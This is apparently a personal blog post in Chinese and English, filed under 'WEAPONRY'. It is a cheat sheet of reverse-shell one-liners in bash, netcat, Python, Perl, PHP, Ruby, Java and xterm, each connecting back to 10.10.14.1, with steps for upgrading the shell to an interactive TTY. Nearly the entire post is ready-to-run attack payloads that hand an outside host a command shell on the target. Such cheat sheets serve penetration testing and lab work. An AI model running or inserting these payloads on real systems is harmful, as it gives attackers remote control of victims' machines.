---
title: Reverse Shell
date: 2020-11-23 23:08:12
category: WEAPONRY
---

# Reverse Shell Cheat Sheet

> 升级成半交互式 tty
> ``` bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> ```
> 升级成完全交互式 tty，能用方向键 + tab，就是退出比较麻烦。**（在 KALI2020.3 上不成功，原因未知，可能跟 zsh 有关？）**
> ``` bash
> python -c 'import pty; pty.spawn("/bin/bash")'
> Ctrl + Z
> stty raw -echo
> fg
> reset
> ```

### Bash
Tested on Ubuntu 10.10
``` bash
/bin/bash -i >& /dev/tcp/10.10.14.1/4444 0>&1
```

### Netcat
不一定所有 nc 都能用哦。
``` bash
# Linux
nc -e /bin/sh 10.10.14.1 4444
# Windows
nc -e cmd.exe 10.10.14.1 4444
```
Netcat-openbsd 版不支持 -e，这时候用下面的。
``` bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f
```

### Python 2.7 
Tested under Linux / Python 2.7
``` bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Perl
``` bash
perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…
``` bash
php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
``` bash
ruby -rsocket -e'f=TCPSocket.open("10.10.14.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java
没测过。
``` java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Xterm
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.10.14.1) on TCP port 6001.
``` bash
xterm -display 10.10.14.1:1
```
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
``` bash
Xnest :1
```
You’ll need to authorise the target to connect to you (command also run on your host):
``` bash
xhost +targetip
```